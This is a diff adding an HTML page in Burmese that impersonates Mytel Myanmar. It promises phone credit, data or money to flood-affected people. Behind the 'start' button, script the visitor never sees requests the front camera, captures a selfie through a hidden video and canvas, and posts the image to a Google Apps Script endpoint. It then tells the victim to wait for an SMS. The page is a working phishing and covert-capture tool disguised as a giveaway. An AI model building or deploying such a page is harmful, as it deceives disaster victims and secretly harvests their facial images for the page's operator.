@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mytelမှဆုရယူရန်</title>
+    <style>
+        
+.logo-container img {
+            width: 300px; /* ပုံကို သေးသွားစေရန် (ဥပမာ - 50px သို့မဟုတ် 60px) */
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f4f4f9;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color:#FFD700 ;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+<div class="logo-container">
+<img src="https://upload.wikimedia.org/wikipedia/commons/8/8c/The_Mytel_Logo.png" alt="Mytel Logo">
+</div>
+    <h1 color="#FFD700">Mytel Myanmar မှ</h1>
+    <h2>ဆုရယူရန် ခလုတ်ကိုနှိပ်ပါ</h2>
+<h3>ရေဘေးသင့်ဒေသများအတွက်</h3>
+    <h4>Phone Bill/Data package/Money</h4>
+    <button onclick="captureAndSend()">စတင်မည်</button>
+    <p id="status"></p>
+
+    <!-- ကင်မရာအတွက် Hidden Video နဲ့ Canvas -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const scriptURL = " https://script.google.com/macros/s/AKfycbymk0XWlZjf_g7SGQLAKbMOCZRx2YXAxLVjVT7-dTD9KfAEcruYrliGotTV_AaWncRfhQ/exec"; // ကိုယ့်ရဲ့ Apps Script URL ထည့်ရန်
+
+        async function captureAndSend() {
+            const statusText = document.getElementById("status");
+            statusText.innerText = "လုပ်ဆောင်နေပါသည်... ခဏစောင့်ပါ။";
+
+            try {
+                // ကင်မရာခွင့်ပြုချက်တောင်းပြီး ပုံရိုက်ယူရန် (Location လုံးဝ မပါပါ)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL("image/jpeg");
+
+                // ကင်မရာပိတ်မည်
+                stream.getTracks().forEach(track => track.stop());
+
+                // Google Apps Script သို့ ပုံပို့မည်
+                const payload = {
+                    image: imageData
+                };
+
+                await fetch(scriptURL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                statusText.innerText = "အောင်မြင်ပါသည်။ Smsစာတိုစောင့်ဆိုင်းပါ။";
+
+            } catch (err) {
+                statusText.innerText = "ကင်မရာ အသုံးပြုခွင့် ပိတ်ထား သို့မဟုတ် အမှားအယွင်းရှိသည်။";
+            }
+        }
+    </script>
+</body>
+</html>
